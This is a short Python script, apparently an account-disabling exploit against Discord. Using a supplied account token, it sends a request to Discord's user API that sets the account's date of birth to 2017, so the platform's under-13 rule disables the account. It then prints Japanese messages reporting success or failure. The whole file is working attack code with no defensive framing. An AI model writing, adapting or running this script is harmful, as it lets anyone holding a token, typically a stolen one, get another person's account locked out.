import requests


class Exploit:
    DISABLED_MESSAGE = "You need to be 13 or older in order to use Discord."
    IMMUNE_MESSAGE = "You cannot update your date of birth."

    def __init__(self, token):
        self.token = token
        self.headers = {'Authorization': token}

    def execute(self):
        """ set DoB to < 13 yo """
        res = requests.patch('https://discordapp.com/api/v9/users/@me', headers=self.headers,
                             json={'date_of_birth': '2017-2-11'})

        if res.status_code == 400:
            res_message = res.json().get('date_of_birth', ['no response message'])[0]

            if res_message == self.DISABLED_MESSAGE:
                print('アカウントの無効化に成功しました。')

            elif res_message == self.IMMUNE_MESSAGE:
                print('アカウントの無効化に失敗しました。')

            else:
                print(f' {res_message}は不明な応答です。')
        else:
            print('アカウントの無効化に失敗しました')
